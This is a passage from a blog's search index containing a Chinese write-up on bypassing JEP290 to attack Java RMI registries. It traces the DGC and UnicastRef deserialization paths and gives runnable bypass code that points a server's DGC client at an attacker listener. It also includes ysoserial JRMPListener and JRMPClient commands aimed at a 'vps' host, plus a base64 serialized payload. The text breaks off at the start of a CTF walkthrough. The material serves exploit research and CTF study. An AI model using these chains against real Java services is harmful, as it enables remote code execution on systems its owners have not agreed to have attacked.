<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RMI高版本攻击探索</title>
      <link href="/2024/10/05/RMI/"/>
      <url>/2024/10/05/RMI/</url>
      
        <content type="html"><![CDATA[<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>121&lt;&#x3D;jdk&lt;&#x3D;230 对rmi进行了一些修复</p><p>尝试攻击会出现以下报错</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112236754-1da5eb30-db8e-4888-9989-ab042cec0132.png"></p><h1 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h1><p>JEP290 是 Java 底层为了缓解反序列化攻击提出的一种解决方案，主要做了以下几件事</p><p>1、提供一个限制反序列化类的机制，白名单或者黑名单。</p><p>2、限制反序列化的深度和复杂度。</p><p>3、为 RMI 远程调用对象提供了一个验证类的机制。</p><p>4、定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器。</p><p>官方从 8u121，7u13，6u141 分别支持了这个 JEP。</p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>既然报错在ObjectInputStream里，那我们就直接把断点打过去</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112237077-9cdd0c34-5c36-42a2-beac-850e1c0fb964.png"></p><p>会先检测以下是否有serialFilter，有的话进入该filter的checkInput</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void filterCheck(Class&lt;?&gt; clazz, int arrayLength)</span><br><span class="line">            throws InvalidClassException &#123;</span><br><span class="line">        if (serialFilter != null) &#123;</span><br><span class="line">            RuntimeException ex = null;</span><br><span class="line">            ObjectInputFilter.Status status;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 跟进</span><br><span class="line">                status = serialFilter.checkInput(new FilterValues(clazz, arrayLength,</span><br><span class="line">                        totalObjectRefs, depth, bin.getBytesRead()));</span><br><span class="line">            &#125; catch (RuntimeException e) &#123;</span><br><span class="line">                // Preventive interception of an exception to log</span><br><span class="line">                status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">                ex = e;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>会进入两次，第一次时DGC，第二次是RegistryImpl</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112237031-bf0f7656-dac9-46fb-8e4d-9eddb32d5ce5.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// RegistryImpl</span><br><span class="line">private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo var0) &#123;</span><br><span class="line">        if (registryFilter != null) &#123;</span><br><span class="line">            ObjectInputFilter.Status var1 = registryFilter.checkInput(var0);</span><br><span class="line">            if (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">                return var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (var0.depth() &gt; (long)REGISTRY_MAX_DEPTH) &#123;</span><br><span class="line">            return Status.REJECTED;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            Class var2 = var0.serialClass();</span><br><span class="line">            if (var2 == null) &#123;</span><br><span class="line">                return Status.UNDECIDED;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (var2.isArray()) &#123;</span><br><span class="line">                    if (var0.arrayLength() &gt;= 0L &amp;&amp; var0.arrayLength() &gt; (long)REGISTRY_MAX_ARRAY_SIZE) &#123;</span><br><span class="line">                        return Status.REJECTED;</span><br><span class="line">                    &#125;</span><br><span class="line">                    do &#123;</span><br><span class="line">                        var2 = var2.getComponentType();</span><br><span class="line">                    &#125; while(var2.isArray());</span><br><span class="line">                &#125;</span><br><span class="line">                if (var2.isPrimitive()) &#123;</span><br><span class="line">                    return Status.ALLOWED;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // 关键点</span><br><span class="line">                    return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里会过所有if，进入到最后一个else，若有相等会返回Status.ALLOWED，也就是这些类是白名单</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return String.class != var2 &amp;&amp;</span><br><span class="line"> !Number.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !Remote.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !Proxy.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !UnicastRef.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !ActivationID.class.isAssignableFrom(var2) &amp;&amp;</span><br><span class="line"> !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure><p>用DGC的打法，进行同样的操作也会发现有白名单，但白名单更少也就更难有利用空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return var2 != ObjID.class &amp;&amp;</span><br><span class="line"> var2 != UID.class &amp;&amp;</span><br><span class="line"> var2 != VMID.class &amp;&amp;</span><br><span class="line"> var2 != Lease.class ? Status.REJECTED : Status.ALLOWED;</span><br></pre></td></tr></table></figure><p>高版本的修复主要是针对于服务端，客户端基本没有修复，而客户端也是可以被攻击的，所以这里的绕过思路就是让服务端发起一个客户端请求，来实现绕过限制</p><h1 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h1><p>这里用正向的去分析，也就是顺着运行的流程进入</p><p>RegistryImpl_Skel的很多方法中都有releaseInputStream，比如list，lookup</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// RegistryImpl_Skel</span><br><span class="line">case 1:</span><br><span class="line">// 跟进</span><br><span class="line">var2.releaseInputStream();</span><br><span class="line">String[] var97 = var6.list();</span><br><span class="line">try &#123;</span><br><span class="line">    ObjectOutput var98 = var2.getResultStream(true);</span><br><span class="line">    var98.writeObject(var97);</span><br><span class="line">    break;</span><br><span class="line">&#125; catch (IOException var92) &#123;</span><br><span class="line">    throw new MarshalException(&quot;error marshalling return&quot;, var92);</span><br><span class="line">&#125;</span><br><span class="line">// StreamRemoteCall</span><br><span class="line">public void releaseInputStream() throws IOException &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    if (this.in != null) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            this.in.done();</span><br><span class="line">        &#125; catch (RuntimeException var5) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">// 跟进</span><br><span class="line">        this.in.registerRefs();</span><br><span class="line">        this.in.done(this.conn);</span><br><span class="line">    &#125;</span><br><span class="line">    this.conn.releaseInputStream();</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">    this.in = null;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试后会发现incomingRefTable通常是空，就进不到DGCClient.registerRefs，所以先静态分析</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728112236747-21b7d09c-b372-4e35-b752-9e716583bc11.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ConnectionInputStream</span><br><span class="line">void registerRefs() throws IOException &#123;</span><br><span class="line">// 关键点</span><br><span class="line">if (!this.incomingRefTable.isEmpty()) &#123;</span><br><span class="line">    Iterator var1 = this.incomingRefTable.entrySet().iterator();</span><br><span class="line">    while(var1.hasNext()) &#123;</span><br><span class="line">        Map.Entry var2 = (Map.Entry)var1.next();</span><br><span class="line">        // 跟进</span><br><span class="line">        DGCClient.registerRefs((Endpoint)var2.getKey(), (List)var2.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// DGCClient</span><br><span class="line">static void registerRefs(Endpoint var0, List&lt;LiveRef&gt; var1) &#123;</span><br><span class="line">    EndpointEntry var2;</span><br><span class="line">    do &#123;</span><br><span class="line">        // 跟进</span><br><span class="line">        var2 = DGCClient.EndpointEntry.lookup(var0);</span><br><span class="line">    &#125; while(!var2.registerRefs(var1));</span><br><span class="line">&#125;</span><br><span class="line">// DGCClient</span><br><span class="line">public static EndpointEntry lookup(Endpoint var0) &#123;</span><br><span class="line">synchronized(endpointTable) &#123;</span><br><span class="line">    EndpointEntry var2 = (EndpointEntry)endpointTable.get(var0);</span><br><span class="line">    if (var2 == null) &#123;</span><br><span class="line">        // 跟进</span><br><span class="line">        var2 = new EndpointEntry(var0);</span><br><span class="line">        endpointTable.put(var0, var2);</span><br><span class="line">        if (gcLatencyRequest == null) &#123;</span><br><span class="line">            gcLatencyRequest = GC.requestLatency(DGCClient.gcInterval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return var2;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// DGCClient</span><br><span class="line">private EndpointEntry(Endpoint var1) &#123;</span><br><span class="line">    this.endpoint = var1;</span><br><span class="line">    try &#123;</span><br><span class="line">        LiveRef var2 = new LiveRef(DGCClient.dgcID, var1, false);</span><br><span class="line">        // 关键点，在服务端创建了DGC客户端</span><br><span class="line">        this.dgc = (DGC)Util.createProxy(DGCImpl.class, new UnicastRef(var2), true);</span><br><span class="line">    &#125; catch (RemoteException var3) &#123;</span><br><span class="line">        throw new Error(&quot;internal error creating DGC stub&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 关键点，创建新线程发送请求，跟进</span><br><span class="line">    this.renewCleanThread = (Thread)AccessController.doPrivileged(new NewThreadAction(new RenewCleanThread(), &quot;RenewClean-&quot; + var1, true));</span><br><span class="line">    this.renewCleanThread.start();</span><br><span class="line">&#125;</span><br><span class="line">// DGCClient</span><br><span class="line">private class RenewCleanThread implements Runnable &#123;</span><br><span class="line">    private RenewCleanThread() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        do &#123;</span><br><span class="line">            RefEntry.PhantomLiveRef var3 = null;</span><br><span class="line">            final boolean var4 = false;</span><br><span class="line">            final Set var5 = null;</span><br><span class="line">            final long var6 = Long.MIN_VALUE;</span><br><span class="line">            long var1;</span><br><span class="line">            long var9;</span><br><span class="line">            synchronized(EndpointEntry.this) &#123;</span><br><span class="line">                var9 = EndpointEntry.this.renewTime - System.currentTimeMillis();</span><br><span class="line">                var1 = Math.max(var9, 1L);</span><br><span class="line">                if (!EndpointEntry.this.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                    var1 = Math.min(var1, DGCClient.cleanInterval);</span><br><span class="line">                &#125;</span><br><span class="line">                EndpointEntry.this.interruptible = true;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                var3 = (RefEntry.PhantomLiveRef)EndpointEntry.this.refQueue.remove(var1);</span><br><span class="line">            &#125; catch (InterruptedException var13) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            synchronized(EndpointEntry.this) &#123;</span><br><span class="line">                EndpointEntry.this.interruptible = false;</span><br><span class="line">                Thread.interrupted();</span><br><span class="line">                if (var3 != null) &#123;</span><br><span class="line">                    EndpointEntry.this.processPhantomRefs(var3);</span><br><span class="line">                &#125;</span><br><span class="line">                var9 = System.currentTimeMillis();</span><br><span class="line">                if (var9 &gt; EndpointEntry.this.renewTime) &#123;</span><br><span class="line">                    var4 = true;</span><br><span class="line">                    if (!EndpointEntry.this.invalidRefs.isEmpty()) &#123;</span><br><span class="line">                        var5 = EndpointEntry.this.invalidRefs;</span><br><span class="line">                        EndpointEntry.this.invalidRefs = new HashSet(5);</span><br><span class="line">                    &#125;</span><br><span class="line">                    var6 = DGCClient.getNextSequenceNum();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">                public Void run() &#123;</span><br><span class="line">                    if (var4) &#123;</span><br><span class="line">                        // 跟进</span><br><span class="line">                        EndpointEntry.this.makeDirtyCall(var5, var6);</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (!EndpointEntry.this.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                        // 这里也是和上面一样的效果，会发送请求</span><br><span class="line">                        EndpointEntry.this.makeCleanCalls();</span><br><span class="line">                    &#125;</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, DGCClient.SOCKET_ACC);</span><br><span class="line">        &#125; while(!EndpointEntry.this.removed || !EndpointEntry.this.pendingCleans.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// DGCClient</span><br><span class="line">private void makeDirtyCall(Set&lt;RefEntry&gt; var1, long var2) &#123;</span><br><span class="line">    assert !Thread.holdsLock(this);</span><br><span class="line">    ObjID[] var4;</span><br><span class="line">    if (var1 != null) &#123;</span><br><span class="line">        var4 = createObjIDArray(var1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        var4 = DGCClient.emptyObjIDArray;</span><br><span class="line">    &#125;</span><br><span class="line">    long var5 = System.currentTimeMillis();</span><br><span class="line">    long var8;</span><br><span class="line">    long var12;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 关键点，发送DGC请求</span><br><span class="line">        Lease var7 = this.dgc.dirty(var4, var2, new Lease(DGCClient.vmid, DGCClient.leaseValue));</span><br><span class="line">        var8 = var7.getValue();</span><br><span class="line">        long var10 = DGCClient.computeRenewTime(var5, var8);</span><br><span class="line">        var12 = var5 + var8;</span><br><span class="line">        synchronized(this) &#123;</span><br><span class="line">            this.dirtyFailures = 0;</span><br><span class="line">            this.setRenewTime(var10);</span><br><span class="line">            this.expirationTime = var12;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception var19) &#123;</span><br><span class="line">        var8 = System.currentTimeMillis();</span><br><span class="line">        synchronized(this) &#123;</span><br><span class="line">            ++this.dirtyFailures;</span><br><span class="line">            if (this.dirtyFailures == 1) &#123;</span><br><span class="line">                this.dirtyFailureStartTime = var5;</span><br><span class="line">                this.dirtyFailureDuration = var8 - var5;</span><br><span class="line">                this.setRenewTime(var8);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                int var11 = this.dirtyFailures - 2;</span><br><span class="line">                if (var11 == 0) &#123;</span><br><span class="line">                    this.dirtyFailureDuration = Math.max(this.dirtyFailureDuration + (var8 - var5) &gt;&gt; 1, 1000L);</span><br><span class="line">                &#125;</span><br><span class="line">                var12 = var8 + (this.dirtyFailureDuration &lt;&lt; var11);</span><br><span class="line">                if (var12 &gt;= this.expirationTime &amp;&amp; this.dirtyFailures &gt;= 5 &amp;&amp; var12 &gt;= this.dirtyFailureStartTime + DGCClient.leaseValue) &#123;</span><br><span class="line">                    this.setRenewTime(Long.MAX_VALUE);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    this.setRenewTime(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (var1 != null) &#123;</span><br><span class="line">                this.invalidRefs.addAll(var1);</span><br><span class="line">                Iterator var20 = var1.iterator();</span><br><span class="line">                while(var20.hasNext()) &#123;</span><br><span class="line">                    RefEntry var21 = (RefEntry)var20.next();</span><br><span class="line">                    var21.markDirtyFailed();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (this.renewTime &gt;= this.expirationTime) &#123;</span><br><span class="line">                this.invalidRefs.addAll(this.refTable.values());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>白名单里可以用到UnicastRef去修改incomingRefTable的值，也就可以实现创建DGC客户端了，首先要找到UnicastRef的反序列化点</p><p>readExternal和readObject有一样的功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    this.ref = LiveRef.read(var1, false);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进LiveRef.read</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    TCPEndpoint var2;</span><br><span class="line">    if (var1) &#123;</span><br><span class="line">        var2 = TCPEndpoint.read(var0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        var2 = TCPEndpoint.readHostPortFormat(var0);</span><br><span class="line">    &#125;</span><br><span class="line">    ObjID var3 = ObjID.read(var0);</span><br><span class="line">    boolean var4 = var0.readBoolean();</span><br><span class="line">    LiveRef var5 = new LiveRef(var3, var2, false);</span><br><span class="line">    if (var0 instanceof ConnectionInputStream) &#123;</span><br><span class="line">        ConnectionInputStream var6 = (ConnectionInputStream)var0;</span><br><span class="line">        // 跟进</span><br><span class="line">        var6.saveRef(var5);</span><br><span class="line">        if (var4) &#123;</span><br><span class="line">            var6.setAckNeeded();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">    &#125;</span><br><span class="line">    return var5;</span><br><span class="line">&#125;</span><br><span class="line">// ConnectionInputStream</span><br><span class="line">void saveRef(LiveRef var1) &#123;</span><br><span class="line">Endpoint var2 = var1.getEndpoint();</span><br><span class="line">Object var3 = (List)this.incomingRefTable.get(var2);</span><br><span class="line">if (var3 == null) &#123;</span><br><span class="line">    var3 = new ArrayList();</span><br><span class="line">    // 关键点，给incomingRefTable赋值</span><br><span class="line">    this.incomingRefTable.put(var2, var3);</span><br><span class="line">&#125;</span><br><span class="line">((List)var3).add(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><p>服务端正常开一个注册中心</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">public class RMIserver &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        RMIobj rmIsobj=new RMIobjmpl();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(1099);</span><br><span class="line">        // registry.bind(&quot;rmIobj&quot;,rmIsobj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端传一个UnicastRef，其中放一个LiveRef进去，tcpEndpoint写恶意服务端的ip和端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import sun.rmi.server.UnicastRef;</span><br><span class="line">import sun.rmi.transport.LiveRef;</span><br><span class="line">import sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line">import java.util.Random;</span><br><span class="line">public class JEP290 &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        ObjID objID=new ObjID(new Random().nextInt());</span><br><span class="line">        TCPEndpoint tcpEndpoint=new TCPEndpoint(&quot;127.0.0.1&quot;,1199);</span><br><span class="line">        UnicastRef unicastRef=new UnicastRef(new LiveRef(objID,tcpEndpoint,false));</span><br><span class="line">        RemoteObjectInvocationHandler evalObject=new RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        //Registry proxy = (Registry) Proxy.newProxyInstance(JEP290.class.getClassLoader(), new Class[] &#123;Registry.class&#125;, evalObject);</span><br><span class="line">        Remote proxy = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] &#123; Remote.class&#125;, evalObject));</span><br><span class="line"></span><br><span class="line">        Registry registry= LocateRegistry.getRegistry(&quot;127.0.0.1&quot;,1099);</span><br><span class="line">        registry.bind(&quot;123&quot;,proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再用yso开一个恶意的服务端，这里有点奇怪的是cc1-4打不了，cc5-7能打通，应该是java版本上去了以后有了一些限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-all.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections6 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p>这里即使报错重复bind也不影响什么，依然能打</p><h1 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h1><p>前面的绕过都要基于一个要求，就是对方要开启RMI服务，因为我们反序列化UnicastRef其实只是改变了一些参数，而真正实现创建客户端DGC和发送请求的是RMI服务的正常流程里的</p><p>那假如对方并没有开RMI服务能不能攻击呢，yso已经给了答案，我们会发现在yso中有这个payload，这个payload和我们绕过的代码是差不多的，那它为什么可以实现凭空开启一个RMI客户端发送请求呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JRMPClient extends PayloadRunner implements ObjectPayload&lt;Registry&gt; &#123;</span><br><span class="line">    public Registry getObject ( final String command ) throws Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        int port;</span><br><span class="line">        int sep = command.indexOf(&#x27;:&#x27;);</span><br><span class="line">        if ( sep &lt; 0 ) &#123;</span><br><span class="line">            port = new Random().nextInt(65535);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            host = command.substring(0, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + 1));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = new ObjID(new Random().nextInt()); // RMI registry</span><br><span class="line">        TCPEndpoint te = new TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        return proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main ( final String[] args ) throws Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成一个payload测试一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar JRMPClient &quot;vps:1199&quot;|base64</span><br></pre></td></tr></table></figure><p>这里就只是单纯的反序列化，没有和RMI服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package demo;</span><br><span class="line">import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line">import sun.rmi.server.UnicastRef;</span><br><span class="line">import sun.rmi.transport.LiveRef;</span><br><span class="line">import sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.ObjID;</span><br><span class="line">import java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line">import java.util.Random;</span><br><span class="line">public class JEP290 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Object obj=b64deser(&quot;rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3NQAKVW5pY2zdFJlZgAMOC4yMTcuMzEuMTc5AAAEr/////+EB&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object b64deser(String b64) throws Exception&#123;</span><br><span class="line">        byte[] code= Base64.decode(b64);</span><br><span class="line">        ByteArrayInputStream bis=new ByteArrayInputStream(code);</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(bis);</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String b64ser(Object obj) throws Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        String b64= java.util.Base64.getEncoder().encodeToString(bos.toByteArray());</span><br><span class="line">        return b64;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再开启一个恶意的服务端来接请求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections6 &#x27;calc&#x27;</span><br></pre></td></tr></table></figure><p>调试会发现在反序列化的时候就创建出了客户端并发送请求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// UnicastRef</span><br><span class="line">public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // 跟进</span><br><span class="line">    this.ref = LiveRef.read(var1, false);</span><br><span class="line">&#125;</span><br><span class="line">// LiveRef</span><br><span class="line">public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        TCPEndpoint var2;</span><br><span class="line">        if (var1) &#123;</span><br><span class="line">            var2 = TCPEndpoint.read(var0);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            var2 = TCPEndpoint.readHostPortFormat(var0);</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID var3 = ObjID.read(var0);</span><br><span class="line">        boolean var4 = var0.readBoolean();</span><br><span class="line">        LiveRef var5 = new LiveRef(var3, var2, false);</span><br><span class="line">        if (var0 instanceof ConnectionInputStream) &#123;</span><br><span class="line">            ConnectionInputStream var6 = (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            if (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 关键点</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line">        return var5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728116372050-c9838311-75e7-4a0b-9c11-a3a050dce713.png"></p><p>这里就和绕过的时候不一样了，如果通过注册中心去绑定一个UnicastRef，那么就会进入到if内，不通过注册中心去绑定就会走到else，而走到else中刚好省去了很多的麻烦，直接就能进到DGCClient开始创建客户端发请求</p><p>而决定是否能进到if就是看var0是否是ConnectionInputStream，而var0的赋值应该是取决于谁反序列化的，注册中心进行的反序列化得到的应该就是ConnectionInputStream，而其他的反序列化操作就是直接进到else</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/34908308/1728115804979-3f68a1bf-6013-480c-a3e6-28cfd9a165d5.png"></p><p>到了这里这个就不在只是绕过，而已经成为了一种Gadget，不需要什么依赖就可以打的一种链子，要手搓的话应该也挺简单的，其实和绕过代码没太大区别就是把UnicastRef包装一下序列化出来吧</p><h1 id="NoCommonCollections"><a href="#NoCommonCollections" class="headerlink" title="NoCommonCollections"></a>NoCommonCollections</h1><p><strong>这里搬出传奇web手boogipop出的题目，这题和主题很相关，要用到RMI实现反序列化攻击，而且要手搓脚本，更好的理解yso的流程</strong></p><p>附件给了源码，首先是NoCommonCollections.jar，开了一个httpserver，post传参进行反序列化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line">package com.nocc.ctf;</span><br><span class="line">import com.sun.net.httpserver.HttpExchange;</span><br><span class="line">import 